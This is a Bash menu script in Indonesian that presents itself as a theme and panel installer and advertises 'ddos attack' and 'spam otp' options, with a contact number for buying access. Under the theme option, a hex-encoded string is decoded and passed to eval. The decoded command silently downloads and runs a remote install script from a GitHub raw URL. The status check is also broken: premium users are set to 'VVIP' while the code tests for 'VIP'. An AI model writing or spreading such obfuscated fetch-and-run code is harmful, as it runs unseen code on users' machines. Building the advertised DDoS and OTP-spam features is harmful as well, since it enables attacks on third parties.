#!/bin/bash

# Definisi warna
BIRU='\033[0;34m'       
MERAH='\033[0;31m'
HIJAU='\033[0;32m'
KUNING='\033[0;33m'
NC='\033[0m'

# Daftar nama-nama yang harus menjadi status premium
PREMIUM_USERS=("marz" "marz001" "marz002")

# Meminta input nama pengguna
read -p "Masukkan nama pengguna: " username

# Memeriksa apakah input nama kosong
if [ -z "$username" ]; then
  echo "Nama pengguna tidak boleh kosong!"
  exit 1
fi

# Menginisialisasi status default
status="FREE"

# Mengecek apakah nama pengguna termasuk dalam daftar premium
for user in "${PREMIUM_USERS[@]}"; do
  if [ "$username" == "$user" ]; then
    status="VVIP"
    break
  fi
done

echo -e "${BIRU}=-----------------------------------------------${NC}"
echo -e "${KUNING}              MENGECEK STATUS USER            ${NC}"
echo -e "${BIRU}=-----------------------------------------------${NC}"
sleep 2
echo -e "${BIRU}=-----------------------------------------------${NC}"
echo -e "${KUNING}                     SELESAI                 ${NC}"
echo -e "${BIRU}=-----------------------------------------------${NC}"
sleep 2
clear

display_welcome() {
  echo -e "${BIRU}=-----------------------------------------------${NC}"
  echo -e "${KUNING}||NAME : $username${NC}"
  echo -e "${KUNING}||STATUS${NC} : ${HIJAU}ONLINE${NC}"
  echo -e "${KUNING}||STATUS USER${NC} : ${HIJAU}$status${NC}"
  echo -e "${BIRU}=-----------------------------------------------${NC}"
  echo -e "${KUNING}||PAKAILAH SESUKA ANDA${NC}"
  echo -e "${KUNING}||NOTE : PEMBELIAN TOKEN BISA LANGSUNG PM${NC}"
  echo -e "${BIRU}=-----------------------------------------------${NC}"
  echo -e "${KUNING}||NO : 085960349812${NC}"
  echo -e "${KUNING}||CREADIT : MARZ OFFC${NC}"
  echo -e "${BIRU}=-----------------------------------------------${NC}"
  sleep 3
  clear
}

select_display() {
  while true; do
    echo -e "${HIJAU}=----------------------------------------------${NC}"
    echo -e "${KUNING}||NAME : $username${NC}"
    echo -e "${KUNING}||STATUS${NC} : ${HIJAU}ONLINE${NC}"
    echo -e "${KUNING}||STATUS USER${NC} : ${HIJAU}$status${NC}"
    echo -e "${HIJAU}=----------------------------------------------${NC}"
    echo -e "${KUNING}||silahkan pilih salah satu dari menu di bawah ini${NC}"
    echo -e "${HIJAU}=----------------------------------------------${NC}"
    if [ "$status" = "VIP" ]; then
      echo -e "||1. instal theme (VIP)"
      echo -e "||2. instal panel (VIP)"
      echo -e "||3. ddos attack (FREE)"
      echo -e "||4. spam otp (FREE)"
    else
      echo -e "||1. instal theme (VIP) - Tidak tersedia untuk status FREE"
      echo -e "||2. instal panel (VIP) - Tidak tersedia untuk status FREE"
      echo -e "||3. ddos attack (VIP) - Tidak tersedia untuk status FREE"
      echo -e "||4. spam otp (FREE)"
    fi
    echo -e "||x. exit"
    echo -e "${HIJAU}=----------------------------------------------${NC}"
    read -r select
    case "$select" in
      1)
        if [ "$status" = "VIP" ]; then
          pkg update
          pkg install vim
          sudo apt update
          sudo apt install vim
          clear
          hex_code='62617368203c28206375726c202d732068747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6d61727a7a2d6c61622f6d61727a7a2f6d61696e2f696e7374616c6c2e736829'
          command=$(echo "${hex_code}" | xxd -r -p)
          eval "$command"
        else
          echo -e "${MERAH}||Fitur ini hanya tersedia untuk pengguna VIP.${NC}"
          echo -e "${KUNING}||SILAHKAN BELI VIP KE OWNER.${NC}"
          sleep 5
          clear
        fi
        ;;
      2)
        if [ "$status" = "VIP" ]; then
          echo -e "${BIRU}=-----------------------------------------------${NC}"
          echo -e "${KUNING}||COMING SOON${NC}"
          echo -e "${BIRU}=-----------------------------------------------${NC}"
          sleep 3
          clear
        else
          echo -e "${MERAH}||Fitur ini hanya tersedia untuk pengguna VIP.${NC}"
          echo -e "${KUNING}||SILAHKAN BELI VIP KE OWNER.${NC}"
          sleep 5
          clear
        fi
        ;;
      3)
        if [ "$status" = "VIP" ]; then
          echo -e "${BIRU}=-----------------------------------------------${NC}"
          echo -e "${KUNING}||COMING SOON${NC}"
          echo -e "${BIRU}=-----------------------------------------------${NC}"
          sleep 3
          clear
        else
          echo -e "${MERAH}||Fitur ini hanya tersedia untuk pengguna VIP.${NC}"
          echo -e "${KUNING}||SILAHKAN BELI VIP KE OWNER.${NC}"
          sleep 5
          clear
        fi
        ;;
      4)
          echo -e "${BIRU}=-----------------------------------------------${NC}"
          echo -e "${KUNING}||COMING SOON${NC}"
          echo -e "${BIRU}=-----------------------------------------------${NC}"
          sleep 3
          clear
        ;;
      x)
        echo -e "${BIRU}=-----------------------------------------------${NC}"
        echo -e "${KUNING}||CLOSE THE SCRIPT${NC}"
        echo -e "${BIRU}=-----------------------------------------------${NC}"
        sleep 2
        clear
        exit 0
        ;;
      *)
        echo -e "${MERAH}||Pilihan tidak valid. Silakan coba lagi.${NC}"
        ;;
    esac
  done
}

# display
display_welcome
select_display
